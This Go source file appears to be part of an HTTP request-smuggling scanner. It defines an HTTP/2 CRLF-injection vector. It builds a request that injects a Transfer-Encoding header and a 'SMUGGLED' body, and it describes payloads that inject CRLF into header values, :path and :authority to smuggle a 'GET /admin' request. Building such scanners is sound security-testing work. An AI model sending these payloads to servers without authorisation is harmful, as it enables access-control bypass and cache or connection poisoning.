package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

type H2CRLFVector struct{}

func NewH2CRLFVector() *H2CRLFVector {
	return &H2CRLFVector{}
}

func (v *H2CRLFVector) Name() string {
	return "H2.CRLF (HTTP/2 Header Splitting via CRLF Injection)"
}

func (v *H2CRLFVector) Type() VectorType {
	return H2CRLF
}

func (v *H2CRLFVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// Basic H2.CRLF: inject TE header via header value
	req1 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"foo": "bar\r\nTransfer-Encoding: chunked",
		},
		Body: []byte("0\r\n\r\nSMUGGLED"),
	}
	payloads = append(payloads, req1)

	return payloads
}

func (v *H2CRLFVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// These are all H2-specific — require RawH2Client to send.
	// We describe them for the H2 scan path.

	// 1. CRLF in custom header to inject Transfer-Encoding
	payloads = append(payloads, RawPayload{
		Name: "h2crlf-te-injection",
		Description: "Inject CRLF into H2 header value to add Transfer-Encoding header in H1 downgrade. " +
			"H2: foo: bar\\r\\nTransfer-Encoding: chunked → H1: Foo: bar\\nTransfer-Encoding: chunked",
		Technique: "h2-crlf-te",
	})

	// 2. CRLF in header value to inject Content-Length
	payloads = append(payloads, RawPayload{
		Name:        "h2crlf-cl-injection",
		Description: "Inject CRLF into H2 header value to add a conflicting Content-Length in H1 downgrade.",
		Technique:   "h2-crlf-cl",
	})

	// 3. CRLF in :path pseudo-header
	payloads = append(payloads, RawPayload{
		Name: "h2crlf-path-injection",
		Description: "Inject CRLF into :path pseudo-header. After downgrade: " +
			"GET /original\\r\\nEvil-Header: injected HTTP/1.1. Can inject arbitrary headers.",
		Technique: "h2-crlf-path",
	})

	// 4. CRLF in :authority pseudo-header
	payloads = append(payloads, RawPayload{
		Name:        "h2crlf-authority-injection",
		Description: "Inject CRLF into :authority pseudo-header to inject headers via Host line in H1 downgrade.",
		Technique:   "h2-crlf-authority",
	})

	// 5. Double CRLF to inject entire request line
	payloads = append(payloads, RawPayload{
		Name: "h2crlf-full-request-inject",
		Description: fmt.Sprintf("Inject \\r\\n\\r\\n to end H1 headers early, then inject a full smuggled request. "+
			"foo: bar\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n", host),
		Technique: "h2-crlf-full-request",
	})

	// 6. CRLF with request body injection (novel)
	payloads = append(payloads, RawPayload{
		Name: "h2crlf-body-injection",
		Description: "Inject CRLF + body content via header. " +
			"foo: bar\\r\\nContent-Length: 10\\r\\n\\r\\nattackbody → injects body into H1 downgraded request.",
		Technique: "h2-crlf-body",
	})

	return payloads
}

func (v *H2CRLFVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
